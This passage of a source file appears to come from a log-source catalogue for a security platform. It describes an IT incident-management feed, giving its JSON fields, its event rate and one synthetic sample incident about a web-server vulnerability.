        logFormat: 'JSON — fields include sys_id, number, state, priority, assignment_group, cmdb_ci, short_description, sys_created_on, sys_updated_on, caller_id, category, subcategory, impact, urgency.',
        avgEPS: '100-5,000 EPS (event-driven from updates and scheduled CMDB syncs)',
        sampleEvent: '{"sys_id":"a1b2c3d4e5f6a7b8","number":"INC0012345","state":"New","priority":"1 - Critical","assignment_group":"Security Operations","cmdb_ci":"web-server-01","short_description":"Critical vulnerability detected on production web server","sys_created_on":"2026-06-11T14:32:08Z","caller_id":"automation","category":"Security","subcategory":"Vulnerability","impact":"1 - High","urgency":"1 - High","business_service":"Customer Portal"}'
      }
    ]
  }
];
